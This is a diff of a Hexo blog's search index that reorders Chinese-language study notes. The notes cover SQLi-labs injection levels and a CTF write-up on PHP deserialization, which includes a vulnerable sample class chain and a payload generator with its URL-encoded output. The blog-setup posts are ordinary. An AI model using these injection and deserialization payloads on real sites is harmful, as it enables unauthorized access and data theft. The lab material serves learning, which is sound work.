@@ -1,24 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/08/04/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>less1-7</title>
     <url>/2024/11/06/less1-7/</url>
     <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
@@ -129,6 +111,24 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/2024/08/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>less18-22</title>
     <url>/2024/11/24/less18-22/</url>
     <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
@@ -176,34 +176,6 @@
       </tags>
   </entry>
   <entry>
-    <title>less46-49</title>
-    <url>/2025/02/19/less46-49/</url>
-    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
-<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
-<p>把所有类型测试完发现是数值型注入。</p>
-<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
-<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
-<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
-<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>less50-53</title>
-    <url>/2025/02/19/less50-53/</url>
-    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
-<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
-<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
-<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
-<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
-]]></content>
-      <tags>
-        <tag>sqlilab注入 web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>less23-27</title>
     <url>/2025/01/14/less23-27/</url>
     <content><![CDATA[<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>尝试之前的get题的方法发现总是有语法错误，而且报错内容中多出一个引号，我们可以推断我们注释符号没有起作用，查看源码。</p>
@@ -234,6 +206,34 @@
 <h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
 <p>27a报错无回显，那么就用大小写过滤。</p>
 <p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less46-49</title>
+    <url>/2025/02/19/less46-49/</url>
+    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
+<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
+<p>把所有类型测试完发现是数值型注入。</p>
+<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
+<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
+<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
+<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less50-53</title>
+    <url>/2025/02/19/less50-53/</url>
+    <content><![CDATA[<p><strong>Less 50 ~ 53 和 Less 46 ~ 49 的注入方法完全一样，但是这 4 个 Less 可以进行堆叠注入。</strong></p>
+<h1 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h1><p>数值型注入，和 Less 46 一样使用报错注入就可以完成</p>
+<h1 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h1><p>单引号闭合的字符型注入，和 Less 47 一样使用报错注入就可以完成。</p>
+<h1 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h1><p>数值型的盲注，和 Less 48 一样使用时间盲注就可以完成。</p>
+<h1 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h1><p>单引号闭合的字符型,和 Less 49 一样使用时间盲注就可以完成。</p>
 ]]></content>
       <tags>
         <tag>sqlilab注入 web</tag>
@@ -315,12 +315,6 @@
       </tags>
   </entry>
   <entry>
-    <title>photos</title>
-    <url>/2024/08/05/photos/</url>
-    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>less8-17</title>
     <url>/2024/11/16/less8-17/</url>
     <content><![CDATA[<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><p>和之前的第五关一样可以用因为正确查询和错误查询的页面不同而使用布尔盲注，脚本如何写后续再更新: )</p>
@@ -356,6 +350,18 @@
       <tags>
         <tag>sqlilab注入 web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>photos</title>
+    <url>/2024/08/05/photos/</url>
+    <content><![CDATA[<p>测试 测试<br><img src="/images/OIP-C.jpg" alt="OIP-C" loading="lazy"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>博客的创建</title>
+    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
+    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
+]]></content>
   </entry>
   <entry>
     <title>upload1-10</title>
@@ -446,10 +452,36 @@
       </tags>
   </entry>
   <entry>
-    <title>博客的创建</title>
-    <url>/2024/08/04/%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%88%9B%E5%BB%BA/</url>
-    <content><![CDATA[<p>搭建过程：<br>    先本地连接GitHub，再在GitHub里创建仓库，然后本地安装hexo，最后将hexo程序上传到GitHub。<br>遇到问题：<br>    1. 初始化hexo时弄错了文件夹<br>      解决：找到hexo程序所在文件夹使用git base初始化<br>    2：上传hexo时出现找不到github的邮箱和用户名的问题<br>      解决：网上寻找，在.deploy-git中的子文件.git找到config，并输入你的邮箱与用户名就可以解决<br>    &#x2F;&#x2F;之前出错的截图没了<br>    3：无法插入图片<br>      解决：b站（<a href="https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1rM411c79A/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>      在source中创建images文件并将你需要的图片放入然后就可以在md文件中引用图片</p>
-]]></content>
+    <title>攻防世界</title>
+    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
+<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
+<p>举例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP反序列化标识符含义：</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
+<p><strong>原理：</strong></p>
+<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
+<p>以下是漏洞中可能遇到的魔法方法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
+
+<p><em>例题</em></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过：</strong></p>
+<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
   </entry>
   <entry>
     <title>思科</title>
@@ -585,38 +617,6 @@
 ]]></content>
       <tags>
         <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界</title>
-    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
-    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
-<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
-<p>举例：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>PHP反序列化标识符含义：</p>
-<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>
-
-<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
-<p><strong>原理：</strong></p>
-<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
-<p>以下是漏洞中可能遇到的魔法方法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>
-
-<p><em>例题</em></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>构造payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span 